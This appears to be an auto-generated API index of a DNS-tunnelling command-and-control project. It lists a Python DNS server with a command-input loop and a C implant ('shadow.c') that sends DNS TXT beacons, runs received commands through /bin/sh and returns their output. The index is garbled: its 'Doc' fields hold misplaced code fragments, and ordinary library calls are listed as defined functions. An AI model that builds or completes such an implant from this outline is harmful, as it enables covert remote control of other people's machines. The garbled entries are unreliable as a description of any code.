# API

## server.py

### encode_b64 (function) `def encode_b64(data)`
- Defined: `server.py:17`

### decode_b64 (function) `def decode_b64(data)`
- Defined: `server.py:20`

### decode_dns_name (function) `def decode_dns_name(data, pos)`
- Defined: `server.py:27`
- Doc: Decodifica un nombre DNS (puede tener compresión)

### build_dns_response (function) `def build_dns_response(query_data, answer_name, qtype, qclass, rdata_str, ttl)`
- Defined: `server.py:49`
- Doc: Construye respuesta DNS con registro A o TXT

### handle_query (function) `def handle_query(data, addr, sock)`
- Defined: `server.py:77`

### dns_server (function) `def dns_server()`
- Defined: `server.py:147`

### cmd_input (function) `def cmd_input()`
- Defined: `server.py:156`

## shadow.c

### encode_b64 (function) `static void encode_b64(const unsigned char *in, size_t len, char *out)`
- Defined: `shadow.c:28`

### decode_b64 (function) `static void decode_b64(const char *in, unsigned char *out, size_t *out_len)`
- Defined: `shadow.c:41`

### build_dns_query (function) `static int build_dns_query(uint16_t id, const char *name, int qtype, unsigned char *buf)`
- Defined: `shadow.c:68`
- Doc: else if (c == '-') val = 62; else if (c == '_') val = 63; else continue; n = (n << 6) | val; bits += 6; if (bits >= 8) {

### dns_query (function) `static int dns_query(const char *name, int qtype, unsigned char *response, size_t *resp_len)`
- Defined: `shadow.c:98`
- Doc: buf[pos++] = len; memcpy(buf + pos, p, len); pos += len; p = dot ? dot + 1 : p + strlen(p); } buf[pos++] = 0; uint16_t q

### run_cmd (function) `static char *run_cmd(const char *cmd)`
- Defined: `shadow.c:128`
- Doc: } struct timeval tv = {5, 0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); struct sockaddr_in from; sockl

### c2_thread (function) `static void *c2_thread(void *arg)`
- Defined: `shadow.c:161`
- Doc: buf[n] = '\0'; output = realloc(output, total + n + 1); if (!output) { close(pipefd[0]); return strdup("realloc failed")

### main (function) `int main(int argc, char **argv)`
- Defined: `shadow.c:223`

### memcpy (function) `memcpy(buf + pos, &id, 2);`
- Defined: `shadow.c:73`

### close (function) `close(sock);`
- Defined: `shadow.c:112`

### setsockopt (function) `setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));`
- Defined: `shadow.c:117`

### dup2 (function) `dup2(pipefd[1], STDOUT_FILENO);`
- Defined: `shadow.c:136`

### execl (function) `execl("/bin/sh", "sh", "-c", cmd, NULL);`
- Defined: `shadow.c:140`

### exit (function) `exit(1);`
- Defined: `shadow.c:141`

### waitpid (function) `waitpid(pid, NULL, 0);`
- Defined: `shadow.c:155`

### srand (function) `srand(time(NULL) ^ getpid());`
- Defined: `shadow.c:167`

### snprintf (function) `snprintf(beacon, sizeof(beacon), "B:PID=%d TIME=%ld", getpid(), time(NULL));`
- Defined: `shadow.c:172`
- Doc: 1. Enviar beacon (TXT)

### fprintf (function) `fprintf(stderr, "[*] Beacon: %s\n", domain);`
- Defined: `shadow.c:175`

### free (function) `free(output);`
- Defined: `shadow.c:215`

### sleep (function) `sleep(BEACON_INTERVAL + (rand() % 5));`
- Defined: `shadow.c:218`

### pthread_create (function) `pthread_create(&t, NULL, c2_thread, NULL);`
- Defined: `shadow.c:226`

### pthread_detach (function) `pthread_detach(t);`
- Defined: `shadow.c:227`
